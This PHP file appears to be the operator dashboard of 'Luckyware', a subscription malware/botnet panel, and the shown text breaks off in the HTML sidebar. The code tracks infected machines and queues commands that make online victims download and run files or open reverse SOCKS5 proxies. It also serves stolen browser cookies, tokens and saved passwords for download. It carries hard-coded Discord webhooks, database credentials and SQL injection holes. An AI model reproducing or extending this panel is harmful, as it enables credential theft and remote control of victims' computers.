<?php
include 'fetch_bot_data.php';

session_start();
$domainyess = $_SERVER['HTTP_HOST'];

$secretkey = $_SESSION['secret_key'];
$username = $_SESSION['admin_name'];
$role = $_SESSION['Role'];


if (!isset($_SESSION['admin_name'])) {
    header('location:../Login/');
} else {

    if ($role == 'User') {
        header('location: https://' . $domainyess . '/Subscriptions');
    }

    $conn = mysqli_connect("localhost", "miner", "Sifre.12345", "luckyminer");


    if ($role == 'Founder') {

        $selectu = "SELECT * FROM miners";
        $resultu = mysqli_query($conn, $selectu);
        $mytk = mysqli_num_rows($resultu);

        $selectan = "SELECT * FROM cards";
        $resultan = mysqli_query($conn, $selectan);
        $mystole = mysqli_num_rows($resultan);


        $fiveMinutesAgo = time() - 360;
        $selectana = "SELECT * FROM miners WHERE LastPing >= $fiveMinutesAgo";
    } else {
        $selectu = "SELECT * FROM miners WHERE OwnerID = '$secretkey'";
        $resultu = mysqli_query($conn, $selectu);
        $mytk = mysqli_num_rows($resultu);

        $selectan = "SELECT * FROM cards WHERE OwnerID = '$secretkey'";
        $resultan = mysqli_query($conn, $selectan);
        $mystole = mysqli_num_rows($resultan);


        $fiveMinutesAgo = time() - 360;
        $selectana = "SELECT * FROM miners WHERE OwnerID = '$secretkey' AND LastPing >= $fiveMinutesAgo";
    }

    $resultanss = mysqli_query($conn, $selectana);
    $myaktv = mysqli_num_rows($resultanss);

    $useracccc = mysqli_query($conn, "SELECT id FROM accounts WHERE OwnerKey = '$secretkey'");
    $rowaacccc = mysqli_fetch_assoc($useracccc);

    $USRIDEY = $rowaacccc["id"];



    if ($role != "Trial") {

        $carlos;
        $CheckLCC = "SELECT * FROM licenses WHERE OwnerID = '$secretkey'";
        $CheckLCCQuery = mysqli_query($conn, $CheckLCC);

        if ($CheckLCCQuery) {

            $carlos = "bok";
            while ($RowLC = mysqli_fetch_assoc($CheckLCCQuery)) {
                // Get the current timestamp
                $CurTmsp = time();

                // Get the ActionSentTime timestamp
                $licenID = intval($RowLC['LicenseID']);
                $UsedTime = intval($RowLC['UsedTime']);
                $Durt = intval($RowLC['Duration']);

                $Endy = $UsedTime + $Durt;

                if ($Endy > $CurTmsp) {
                    $carlos = "ok";
                } else {
                    $carlos = "nok";
                }
            }



            if ($carlos == "ok" || $role == "Founder") {
            } else if ($carlos == "nok") {

                $setok = "Expired";
                $sqlUpdate = "UPDATE licenses SET OwnerID = ? WHERE LicenseID = ?";
                $stmtUpdate = $conn->prepare($sqlUpdate);
                $stmtUpdate->bind_param("si", $setok, $licenID);

                if ($stmtUpdate->execute()) {
                } else {
                }


                $treel = "Trial";
                $sqlUpdateAC = "UPDATE accounts SET Role = ? WHERE OwnerKey = ?";
                $stmtUpdateAC = $conn->prepare($sqlUpdateAC);
                $stmtUpdateAC->bind_param("ss", $treel, $secretkey);

                if ($stmtUpdateAC->execute()) {
                } else {
                }

                session_destroy();
                echo '<script>alert("Your Subscription Has Expired!")</script>';

                header('location: https://' . $domainyess . '/Login');
            } else if ($carlos == "bok") {
                if ($role == "Premium" || $role == "Special") {

                    $treel = "Trial";
                    $sqlUpdateAC = "UPDATE accounts SET Role = ? WHERE OwnerKey = ?";
                    $stmtUpdateAC = $conn->prepare($sqlUpdateAC);
                    $stmtUpdateAC->bind_param("ss", $treel, $secretkey);

                    if ($stmtUpdateAC->execute()) {
                    } else {
                    }

                    session_destroy();
                    echo '<script>alert("No more for free u gotta pay.")</script>';
                }
            }
        }
    }
}


function sendDiscordWebhookMessage($webhookURL, $message)
{
    // Create a JSON payload with the message content
    $payload = json_encode(
        array(
            'content' => $message
        )
    );

    // Set the content type and headers for the POST request
    $headers = array(
        'Content-Type: application/json',
    );

    // Initialize cURL session
    $ch = curl_init($webhookURL);

    // Set cURL options
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
    curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Execute cURL session and get the response
    $response = curl_exec($ch);



    // Close cURL session
    curl_close($ch);
}

if ($username == "Hopesar") {
    $sqlSelect = "SELECT * FROM miners";
} else {
    $sqlSelect = "SELECT * FROM miners WHERE OwnerID = '$secretkey'";
}


if (isset($_POST['id'])) {
    // Handle the deletion here
    $idA = $_POST['id'];

    // Update the OwnerID (you should replace "Botnets" with your actual table name and "OwnerID" with the appropriate column name)
    $sqlUpdate = "UPDATE miners SET OwnerID = ? WHERE BotID = ?";
    $stmtUpdate = $conn->prepare($sqlUpdate);
    $newOwnerID = 'rz6zarjmaf0u9jq4v53hsnz4no61k2'; // Replace with the new OwnerID value
    $stmtUpdate->bind_param("si", $newOwnerID, $idA);

    $webhookURL44 = 'https://discord.com/api/webhooks/1375397254172639274/1H6_lYoZhcMy4PZ8puUnN86oHZhR8WniKvMHq3PWZkN8j-o7_IUBFtMzSloEmF4XTqTB';
    $messagerrr = 'New Connection Deleted By ' . $username . ' Connection Swapped To Your Owner Key Bot Id Is ' . $idA;


    sendDiscordWebhookMessage($webhookURL44, $messagerrr);


    if ($stmtUpdate->execute()) {
    } else {
    }
}

function startsWith($haystack, $needle)
{
    return strpos($haystack, $needle) === 0;
}

function sanitizeInput($input)
{
    // Define the list of forbidden characters
    $forbiddenChars = ['-', '(', ')', '=', '*'];

    $isac = '0';
    // Check if the input contains any forbidden characters
    foreach ($forbiddenChars as $char) {
        if (strpos($input, $char) !== false) {
            // Forbidden character found, handle the error (you can customize this part)
            $isac = '1';
        }
    }

    if ($isac == '1') {

        return 'NoSpecialChar';
    } else {
        return htmlspecialchars($input, ENT_QUOTES, 'UTF-8');
    }
}

$normuser = $secretkey;
if ($role == 'Founder') {
    $normuser = 'yes';
}

if (isset($_POST["execsend"])) {
    $filurl = $_POST['filurl'];
    $idew = sanitizeInput($_POST['botIdaq']);

    $sqlhewed = "SELECT * FROM miners WHERE BotID = '$idew'";
    $resultHEWED = $conn->query($sqlhewed);

    // Check if the query was successful
    if ($resultHEWED) {
        if ($resultHEWED->num_rows > 0) {
            $rowHH = $resultHEWED->fetch_assoc();
            $HEWED = $rowHH['HWID'];
            $PINGOTIM = $rowHH['LastPing'];
        }
    }

    $curtime = time();

    $timeDifference = $curtime - $PINGOTIM;

    if ($timeDifference <= 360) {
        $inserttcp = "INSERT INTO actions (HWID, ActionInfo, ActionType, ActionOwner, ActionStatus, ActionSentTime) VALUES (?, ?, 'exc', ?, '50', ?)";

        if ($stmttc = mysqli_prepare($conn, $inserttcp)) {
            // Bind variables to the prepared statement as parameters
            mysqli_stmt_bind_param($stmttc, "ssss", $HEWED, $filurl, $normuser, $curtime);

            // Execute the prepared statement
            if (mysqli_stmt_execute($stmttc)) {
                // The query was successful
                $url = "https://discord.com/api/webhooks/1375397314595782728/ljdFIqCbHozO7jcPAqp3UoqFBzPAUgtksA2JR_zhvlMbZnpCbOwIZLzQzT6qcCpkofkc";
                $headers = ['Content-Type: application/json; charset=utf-8'];
                $messages = 'File URL: ' . $filurl . ' Mode: ' . 'Disk Execution' . ' Action Owner: ' . $username;
                $POST = ['username' => 'Action Logs', 'content' => $messages];

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                $response = curl_exec($ch);
            } else {
                // An error occurred

            }

            // Close the statement
            mysqli_stmt_close($stmttc);
        } else {
            // An error occurred while preparing the statement
            echo "Error: " . mysqli_error($conn);
        }
    } else {
        echo "<script type='text/javascript'>alert('You can only send execute action to online clients!');</script>";
    }
}


if (isset($_POST["proxsend"])) {

    if ($role != "Special" && $role != "Founder") {
        echo "<script type='text/javascript'>alert('Reverse SOCKS5 Is A Special Subscription Feature!');</script>";
    } else {
        $proxpot = $_POST['proxpot'];
        $idew = sanitizeInput($_POST['botIdaq']);

        $sqlhewed = "SELECT * FROM miners WHERE BotID = '$idew'";
        $resultHEWED = $conn->query($sqlhewed);

        // Check if the query was successful
        if ($resultHEWED) {
            if ($resultHEWED->num_rows > 0) {
                $rowHH = $resultHEWED->fetch_assoc();
                $HEWED = $rowHH['HWID'];
                $PINGOTIM = $rowHH['LastPing'];
            }
        }

        $curtime = time();

        $timeDifference = $curtime - $PINGOTIM;

        if ($timeDifference <= 360) {
            $inserttcp = "INSERT INTO actions (HWID, ActionInfo, ActionType, ActionOwner, ActionStatus, ActionSentTime) VALUES (?, ?, 'RVRS', ?, '50', ?)";

            if ($stmttc = mysqli_prepare($conn, $inserttcp)) {
                // Bind variables to the prepared statement as parameters
                mysqli_stmt_bind_param($stmttc, "ssss", $HEWED, $proxpot, $normuser, $curtime);

                // Execute the prepared statement
                if (mysqli_stmt_execute($stmttc)) {
                    // The query was successful
                    $url = "https://discord.com/api/webhooks/1375397314595782728/ljdFIqCbHozO7jcPAqp3UoqFBzPAUgtksA2JR_zhvlMbZnpCbOwIZLzQzT6qcCpkofkc";
                    $headers = ['Content-Type: application/json; charset=utf-8'];
                    $messages = 'Proxy Server: ' . $proxpot . ' Mode: ' . 'Reverse Socks5' . ' Action Owner: ' . $username;
                    $POST = ['username' => 'Action Logs', 'content' => $messages];

                    $ch = curl_init();
                    curl_setopt($ch, CURLOPT_URL, $url);
                    curl_setopt($ch, CURLOPT_POST, true);
                    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
                    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                    $response = curl_exec($ch);
                } else {
                    // An error occurred

                }

                // Close the statement
                mysqli_stmt_close($stmttc);
            } else {
                // An error occurred while preparing the statement
                echo "Error: " . mysqli_error($conn);
            }
        } else {
            echo "<script type='text/javascript'>alert('You can only start Reverse SOCKS5 Session on online clients!');</script>";
        }
    }
}

if (isset($_POST['purgebig'])) {
    // Handle the deletion here
    $idA = sanitizeInput($_POST['purgebig']);

    $usercred = mysqli_query($conn, "SELECT BotID, HWID FROM miners WHERE BotID = '$idA'");
    $rowacred = mysqli_fetch_assoc($usercred);

    $HWIDOBOT = $rowacred["BotID"];


    $sqlhewed = "SELECT HWID FROM miners WHERE BotID = '$useringid'";
    $resultHEWED = $conn->query($sqlhewed);

    $HEWED;
    // Check if the query was successful
    if ($resultHEWED) {
        if ($resultHEWED->num_rows > 0) {
            $rowHH = $resultHEWED->fetch_assoc();
            $HEWED = $rowHH['HWID'];
        }
    }

    $newOwnerID = 'rz6zarjmaf0u9jq4v53hsnz4no61k2'; // Replace with the new OwnerID value
    $passidolo = "2";

    $sqlUpdate = "UPDATE miners SET OwnerID = ? WHERE BotID = ?";
    $stmtUpdate = $conn->prepare($sqlUpdate);
    $stmtUpdate->bind_param("si", $newOwnerID, $idA);

    if ($stmtUpdate->execute()) {
    } else {
    }


    $sqlUpdateTKN = "UPDATE tokens SET OwnerID = ? WHERE OwnerID = ? AND HWID = ?";
    $stmtUpdateTKN = $conn->prepare($sqlUpdateTKN);
    $stmtUpdateTKN->bind_param("sss", $newOwnerID, $secretkey, $HEWED);

    if ($stmtUpdateTKN->execute()) {
    } else {
    }


    $sqlUpdatePSS = "UPDATE passwords SET OwnerID = ? WHERE OwnerID = ? AND HWID = ?";
    $stmtUpdatePSS = $conn->prepare($sqlUpdatePSS);
    $stmtUpdatePSS->bind_param("sss", $passidolo, $USRIDEY, $HWIDOBOT);

    if ($stmtUpdatePSS->execute()) {
    } else {
    }


    $sqlUpdateCKKO = "UPDATE cookies SET OwnerID = ? WHERE OwnerID = ? AND HWID = ?";
    $stmtUpdateCKKO = $conn->prepare($sqlUpdateCKKO);
    $stmtUpdateCKKO->bind_param("sss", $passidolo, $USRIDEY, $HWIDOBOT);

    if ($stmtUpdateCKKO->execute()) {
    } else {
    }

    $webhookURL44 = 'https://discord.com/api/webhooks/1375397254172639274/1H6_lYoZhcMy4PZ8puUnN86oHZhR8WniKvMHq3PWZkN8j-o7_IUBFtMzSloEmF4XTqTB';
    $messagerrr = 'New Bot PURGE By ' . $username . ' Bot Swapped To Your Owner Key Bot Id Is ' . $idA;


    sendDiscordWebhookMessage($webhookURL44, $messagerrr);
}


$cokerdata = 'Download Cookies (Chrome)';

if (isset($_POST['ides'])) {
    // Handle the deletion here
    $useringid = sanitizeInput($_POST['ides']);

    $cokerdata = 'Downloading... Please Wait';

    $usercred = mysqli_query($conn, "SELECT BotID, HWID FROM miners WHERE BotID = '$useringid'");
    $rowacred = mysqli_fetch_assoc($usercred);

    $HWIDOBOT = $rowacred["BotID"];

    if ($role == 'Founder') {
        $sqlAQA = "SELECT * FROM cookies WHERE HWID = '$HWIDOBOT'";
    } else {
        $sqlAQA = "SELECT * FROM cookies WHERE HWID = '$HWIDOBOT' AND OwnerID = '$USRIDEY'";
    }
    $resultAQA = $conn->query($sqlAQA);

    // Initialize the output
    $output = '';

    // Process the database results and format them
    if ($resultAQA->num_rows > 0) {
        while ($RowANAMMM = $resultAQA->fetch_assoc()) {
            $output .= $RowANAMMM["Urls"] . "\t" . $RowANAMMM["expires_true"] . "\t" . $RowANAMMM["path"] . "\t" . $RowANAMMM["hostkeydot"] . "\t" . $RowANAMMM["expires_time"] . "\t" . $RowANAMMM["Names"] . "\t" . $RowANAMMM["Cookie"] . "\n";
        }
    } else {
        $output .= "No Cookie Data!";
    }

    $filename = "CookiesID" . $useringid . ".txt";
    // Set the appropriate HTTP headers for downloading
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $filename . '"');

    // Output the data and exit
    echo $output;
    $cokerdata = 'Download Cookies (Chrome)';
    exit; // This will stop further execution and prevent the unwanted HTML content from being appended.
}


if (isset($_POST['taken'])) {
    // Handle the deletion here
    $useringid = sanitizeInput($_POST['taken']);

    // Construct a basic SQL query
    $sqlhewed = "SELECT HWID FROM miners WHERE BotID = '$useringid'";
    // Execute the query
    $resultHEWED = $conn->query($sqlhewed);

    // Check if the query was successful
    if ($resultHEWED) {
        if ($resultHEWED->num_rows > 0) {
            $rowHH = $resultHEWED->fetch_assoc();
            $HEWED = $rowHH['HWID'];
        }
    }

    // Query the database to fetch the data

    if ($role == 'Founder') {
        $sqlAQA = "SELECT * FROM tokens WHERE HWID = '$HEWED'";
    } else {
        $sqlAQA = "SELECT * FROM tokens WHERE HWID = '$HEWED' AND OwnerID = '$secretkey'";
    }
    $resultAQA = $conn->query($sqlAQA);

    // Initialize the output
    $output = '';

    // Process the database results and format them
    if ($resultAQA->num_rows > 0) {
        while ($RowANAMMM = $resultAQA->fetch_assoc()) {
            $output .= $RowANAMMM["Token"] . "\n";
        }
    } else {
        $output .= "No Token Data!";
    }

    $filename = "TokensID" . $useringid . ".txt";
    // Set the appropriate HTTP headers for downloading
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $filename . '"');

    // Output the data and exit
    echo $output;

    exit; // This will stop further execution and prevent the unwanted HTML content from being appended.
}


if (isset($_POST['Pesord'])) {
    // Handle the deletion here
    $useringid = sanitizeInput($_POST['Pesord']);

    $usercred = mysqli_query($conn, "SELECT BotID, HWID FROM miners WHERE BotID = '$useringid'");
    $rowacred = mysqli_fetch_assoc($usercred);

    $HWIDOBOT = $rowacred["BotID"];

    if ($role == 'Founder') {
        $sqlAQA = "SELECT * FROM passwords WHERE HWID = '$HWIDOBOT' AND Browser = '1'";
    } else {
        $sqlAQA = "SELECT * FROM passwords WHERE HWID = '$HWIDOBOT' AND OwnerID = '$USRIDEY' AND Browser = '1'";
    }
    $resultAQA = $conn->query($sqlAQA);

    // Initialize the output
    $output = '';

    // Process the database results and format them
    if ($resultAQA->num_rows > 0) {
        while ($RowANAMMM = $resultAQA->fetch_assoc()) {
            $output .= $RowANAMMM["Urls"] . "\t" . $RowANAMMM["Username"] . "\t" . $RowANAMMM["Pass"] . "\n";
        }
    } else {
        $output .= "No Pass Data!";
    }

    $filename = "ChromePassID" . $useringid . ".txt";
    // Set the appropriate HTTP headers for downloading
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $filename . '"');

    // Output the data and exit
    echo $output;

    exit; // This will stop further execution and prevent the unwanted HTML content from being appended.
}


if (isset($_POST['Pesorded'])) {
    // Handle the deletion here
    $useringid = sanitizeInput($_POST['Pesorded']);

    $usercred = mysqli_query($conn, "SELECT BotID, HWID FROM miners WHERE BotID = '$useringid'");
    $rowacred = mysqli_fetch_assoc($usercred);

    $HWIDOBOT = $rowacred["BotID"];

    if ($role == 'Founder') {
        $sqlAQA = "SELECT * FROM passwords WHERE HWID = '$HWIDOBOT' AND Browser = '2'";
    } else {
        $sqlAQA = "SELECT * FROM passwords WHERE HWID = '$HWIDOBOT' AND OwnerID = '$USRIDEY' AND Browser = '2'";
    }
    $resultAQA = $conn->query($sqlAQA);

    // Initialize the output
    $output = '';

    // Process the database results and format them
    if ($resultAQA->num_rows > 0) {
        while ($RowANAMMM = $resultAQA->fetch_assoc()) {
            $output .= $RowANAMMM["Urls"] . "\t" . $RowANAMMM["Username"] . "\t" . $RowANAMMM["Pass"] . "\n";
        }
    } else {
        $output .= "No Pass Data!";
    }

    $filename = "EdgePassID" . $useringid . ".txt";
    // Set the appropriate HTTP headers for downloading
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $filename . '"');

    // Output the data and exit
    echo $output;

    exit; // This will stop further execution and prevent the unwanted HTML content from being appended.
}



if (isset($_POST['Pesordbr'])) {
    // Handle the deletion here
    $useringid = sanitizeInput($_POST['Pesordbr']);

    $usercred = mysqli_query($conn, "SELECT BotID, HWID FROM miners WHERE BotID = '$useringid'");
    $rowacred = mysqli_fetch_assoc($usercred);

    $HWIDOBOT = $rowacred["BotID"];

    if ($role == 'Founder') {
        $sqlAQA = "SELECT * FROM passwords WHERE HWID = '$HWIDOBOT' AND Browser = '3'";
    } else {
        $sqlAQA = "SELECT * FROM passwords WHERE HWID = '$HWIDOBOT' AND OwnerID = '$USRIDEY' AND Browser = '3'";
    }
    $resultAQA = $conn->query($sqlAQA);

    // Initialize the output
    $output = '';

    // Process the database results and format them
    if ($resultAQA->num_rows > 0) {
        while ($RowANAMMM = $resultAQA->fetch_assoc()) {
            $output .= $RowANAMMM["Urls"] . "\t" . $RowANAMMM["Username"] . "\t" . $RowANAMMM["Pass"] . "\n";
        }
    } else {
        $output .= "No Pass Data!";
    }

    $filename = "BravePassID" . $useringid . ".txt";
    // Set the appropriate HTTP headers for downloading
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $filename . '"');

    // Output the data and exit
    echo $output;

    exit; // This will stop further execution and prevent the unwanted HTML content from being appended.
}


if (isset($_POST['Pesordal'])) {
    // Handle the deletion here
    $useringid = sanitizeInput($_POST['Pesordal']);

    $usercred = mysqli_query($conn, "SELECT BotID, HWID FROM miners WHERE BotID = '$useringid'");
    $rowacred = mysqli_fetch_assoc($usercred);

    $HWIDOBOT = $rowacred["BotID"];

    if ($role == 'Founder') {
        $sqlAQA = "SELECT * FROM passwords WHERE HWID = '$HWIDOBOT'";
    } else {
        $sqlAQA = "SELECT * FROM passwords WHERE HWID = '$HWIDOBOT' AND OwnerID = '$USRIDEY'";
    }
    $resultAQA = $conn->query($sqlAQA);

    // Initialize the output
    $output = '';

    // Process the database results and format them
    if ($resultAQA->num_rows > 0) {
        while ($RowANAMMM = $resultAQA->fetch_assoc()) {
            $output .= $RowANAMMM["Urls"] . "\t" . $RowANAMMM["Username"] . "\t" . $RowANAMMM["Pass"] . "\n";
        }
    } else {
        $output .= "No Pass Data!";
    }

    $filename = "AllPassID" . $useringid . ".txt";
    // Set the appropriate HTTP headers for downloading
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . $filename . '"');

    // Output the data and exit
    echo $output;

    exit; // This will stop further execution and prevent the unwanted HTML content from being appended.
}


?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="assets/css/custom.css">
    <link rel="stylesheet" href="assets/css/style.css">
    <link rel="stylesheet" href="assets/css/hover.css">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://dooovid.github.io/smoothcaret/demo/smoothCaret.min.js" defer></script>
    <link rel="stylesheet" href="../assets/fontaw/css/all.min.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="stylesheet" type="text/css" href="https://cdn.datatables.net/1.11.5/css/jquery.dataTables.css">
    <script type="text/javascript" charset="utf8"
        src="https://cdn.datatables.net/1.11.5/js/jquery.dataTables.js"></script>
    <meta content="Luckyware" property="og:title" />
    <meta content="Luck is something you make and victory is something u take" property="og:description" />
    <meta content="https://<?php echo $domainyess; ?>" property="og:url" />
    <meta content="https://<?php echo $domainyess; ?>/icon.png" property="og:image" />
    <meta content="#e2ff85" data-react-helmet="true" name="theme-color" />
    <link rel="shortcut icon" href="https://<?php echo $domainyess; ?>/icon.png" />
    <title>Dashboard</title>

    <style>
        .status-online-text {
            color: #22c55e;
            font-weight: 600;
            text-shadow:
                0 0 2px rgba(34, 197, 94, 0.4),
                0 0 3px rgba(34, 197, 94, 0.3),
                0 0 5px rgba(34, 197, 94, 0.2);
            animation: pulse-glow 5s infinite;
        }

        .status-offline-text {
            color: #ef4444;
            font-weight: 600;
            text-shadow:
                0 0 2px rgba(239, 68, 68, 0.35),
                0 0 4px rgba(239, 68, 68, 0.25);
        }

        .status-dead-text {
            color: #9ca3af;
            font-weight: 500;
        }



        @keyframes pulse-glow {

            0%,
            100% {
                text-shadow:
                    0 0 8px rgba(34, 197, 94, 0.8),
                    0 0 12px rgba(34, 197, 94, 0.6),
                    0 0 16px rgba(34, 197, 94, 0.4);
            }

            50% {
                text-shadow:
                    0 0 12px rgba(34, 197, 94, 1),
                    0 0 18px rgba(34, 197, 94, 0.8),
                    0 0 24px rgba(34, 197, 94, 0.6);
            }
        }


        .pulse-green {
            animation: pulse-green-glow 2s ease-in-out infinite;
            border: 1px solid #10b981;
            box-shadow: 0 0 5px rgba(16, 185, 129, 0.3);
        }

        @keyframes pulse-green-glow {

            0%,
            100% {
                box-shadow: 0 0 5px rgba(16, 185, 129, 0.3);
                border-color: #10b981;
                opacity: 1;
            }

            50% {
                box-shadow: 0 0 10px rgba(16, 185, 129, 0.6);
                border-color: #10b981;
                opacity: 0.85;
            }
        }


        .premium-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(8, 8, 8, 0.8);
            /* Semi-transparent black */
            box-shadow: 0 0 20px rgba(8, 8, 8, 0.9);
            /* Black glow effect */
            border-radius: 0.5rem;
            /* Match your container's rounded-lg */
            /* Match your container's rounded-lg */
            z-index: 10;
            /* Ensure it appears above other content */
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .premium-content {
            text-align: center;
            padding: 20px;
        }


        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #111111;
            z-index: 9999;
            display: flex;
            justify-content: center;
            align-items: center;
            opacity: 1;
            visibility: visible;
            /* Add visibility property */
            transition: all 1s ease;
            /* Longer transition and apply to all */
        }

        .loading-overlay.fade-out {
            opacity: 0;
            visibility: hidden;
            /* Hide element after fade */
        }

        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #333;
            border-radius: 50%;
            border-top-color: rgb(173, 25, 12);
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            100% {
                transform: rotate(360deg);
            }
        }




        #DashTable {
            border-radius: 0.5rem;
            background-color: var(--background);
            border-collapse: separate;
            border-spacing: 0 0.7rem;
            width: 100%;
            /* Add this line */
            min-width: 800px;
            /* Ensures table doesn't get too cramped */
        }

        #DashTable th {
            font-family: 'Kanit', sans-serif;
            font-weight: 500;
            color: #e7e5e4;
            font-weight: bold;
            text-align: center;
            padding: 10px;
            border-bottom: 1px solid var(--background);
        }

        #DashTable tr {
            background-color: var(--background);
            border-radius: 0.5rem;
        }

        #DashTable td {
            background-color: #151515;
            color: #a8a29e;
            text-align: center;
            border-bottom: 1px solid var(--background);
            padding: 10px;
            font-weight: 100;
            font-family: 'Kanit', sans-serif;
        }

        #DashTable td:first-child {
            border-radius: 0.5rem 0 0 0.5rem;
            /* Rounded corners on the left side */
        }

        #DashTable td:last-child {
            border-radius: 0 0.5rem 0.5rem 0;
            /* Rounded corners on the right side */
        }

        #DashTable tbody tr:hover {
            background-color: var(--main-hover-color);
            color: #D6D3D1;
        }

        /* Custom hover link color */
        .hover-link {
            color: #111111;
            transition: color 0.3s ease-in-out;
        }

        .hover-link:hover {
            color: #f54b42;
        }

        .dataTables_wrapper .dataTables_paginate .paginate_button {
            background-color: #151515;
            /* Add !important to ensure white color */
            border: none;
            padding: 7px 10px;
            margin: 2px;
            cursor: pointer;
            color: #a8a29e;
        }

        .dataTables_wrapper .dataTables_paginate .paginate_button:hover {
            background-color: #181818;
            border: none;
        }

        .dataTables_wrapper .dataTables_paginate .paginate_button.current {
            background-color: #850000;
            color: #e7e5e4;
            border: none;
        }

        /* Text color for elements like "Showing x to x of x entries" */
        .dataTables_info,
        .dataTables_length,
        .dataTables_paginate,
        .dataTables_filter {
            color: #a8a29e !important;
            margin-bottom: 7px;
            /* Add space below these elements */
        }

        /* Add space between "Show entries" and pagination controls */
        .dataTables_length,
        .dataTables_paginate {
            margin-top: 7px;
        }

        /* Color for the "Show x entries" dropdown and options */
        .dataTables_length select {
            background-color: #111111 !important;
            color: #d6d3d1 !important;
            border: 1px solid #181818 !important;
            /* Remove border to make it borderless */
            padding: 5px;
        }

        /* Color for the pagination controls */
        .dataTables_paginate a,
        .dataTables_paginate span,
        .dataTables_paginate .ellipsis {
            background-color: #111111;
            color: #d6d3d1 !important;
            /* Important to override DataTable's default styles */
            border: none;
            padding: 5px 10px;
            margin: 2px;
            cursor: pointer;
        }

        /* Hover color for pagination controls */
        .dataTables_paginate a:hover {
            background-color: #181818;
            border: none;
        }

        /* Current page number color */
        .dataTables_paginate .current {
            background-color: #850000;
            color: #d6d3d1 !important;
            /* Important to override DataTable's default styles */
            border: none;
        }

        /* DataTable search box styles */
        .dataTables_wrapper .dataTables_filter input {
            background-color: var(--background);
            color: #ffffff;
            border: 1px solid #181818;
            /* Add a 1px gray border */
            border-radius: 5px;
            padding: 5px;
        }

        /* DataTable ordering arrow styles */
        .dataTables_wrapper .dataTables_wrapper .sorting:after,
        .dataTables_wrapper .dataTables_wrapper .sorting:before,
        .dataTables_wrapper .dataTables_wrapper .sorting_asc:after,
        .dataTables_wrapper .dataTables_wrapper .sorting_asc:before,
        .dataTables_wrapper .dataTables_wrapper .sorting_desc:after,
        .dataTables_wrapper .dataTables_wrapper .sorting_desc:before {
            color: var(--main-color);
        }

        .table-responsive {
            background-color: #111111;
            color: #D6D3D1;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            /* Add these lines */
            -webkit-overflow-scrolling: touch;
            max-width: 100%;
        }

        /* DataTable scrollbar styles (if needed) */
        #DashTable::-webkit-scrollbar {
            width: 8px;
        }

        #DashTable::-webkit-scrollbar-thumb {
            background-color: var(--main-color);
        }

        #DashTable::-webkit-scrollbar-track {
            background-color: var(--secondary-background);
        }


        .current {
            background-color: #850000;
        }


        /* Mobile improvements */
        @media (max-width: 640px) {
            .col-span-10 {
                padding: 0 10px;
            }

            .gap-5 {
                gap: 1rem;
            }

            .px-5 {
                padding-left: 0.75rem;
                padding-right: 0.75rem;
            }

            .text-lg {
                font-size: 1rem;
            }

            /* Make buttons more touch-friendly */
            button {
                min-height: 44px;
            }
        }
    </style>

</head>

<body class="dg">
    <div class="loading-overlay">
        <div class="loading-spinner"></div>
    </div>
    <div id="mobile topNav" class="bg xl:hidden"> <!-- MOBILE TOPNAV -->
        <div class="grid sm:grid-cols-2 px-5 py-3">
            <div class="1 text-left">
                <div class="flex">
                    <img class="w-12" src="https://<?php echo $domainyess; ?>/icon.png" alt="">
                    <h1 class="py-5 fntBold tracking-wide text-lg text-stone-300 ml-3">Luckyware <span
                            class="textCol">Dashboard</span></h1>
                </div>
            </div>
            <div class="2 text-right">
                <button class="text-xl text-stone-300 py-5"><i class="fa-solid fa-bars"></i></button>
            </div>
        </div>
    </div>

    <div class="grid xl:grid-cols-12"> <!-- start -->

        <div class="col-span-2 bg xl:grid sm:hidden pb-24 rounded-lg"> <!-- DESKTOP SIDENAV -->
            <div class="1">
                <div class="flex justify-center mt-10">
                    <h1 class="text-stone-300 fntBold text-2xl tracking-wide">
                        Lucky <span class="textCol">Ware</span>
                    </h1>
                </div>

                <div class="mx-5 mt-6">
                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn border-b brdCol">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Dashboard</h1>
                            </div>
                            <div class="2 text-right">
                                <i class="fa-solid fa-house textCol mt-1 icon"></i>
                            </div>
                        </div>
                    </button>

                    <button onclick="location.href='https://<?php echo $domainyess; ?>/Dashboard/Builder';"
                        class="dg w-full text-left px-5 py-4 rounded-lg btn hvr-underline-from-center mt-4">
                        <div class="grid grid-cols-2">
                            <div class="1">
                                <h1 class="text-stone-400 fntBold tracking-wide text-lg">Builder</h1>
                            </div>
                            <div class="2 text-right">
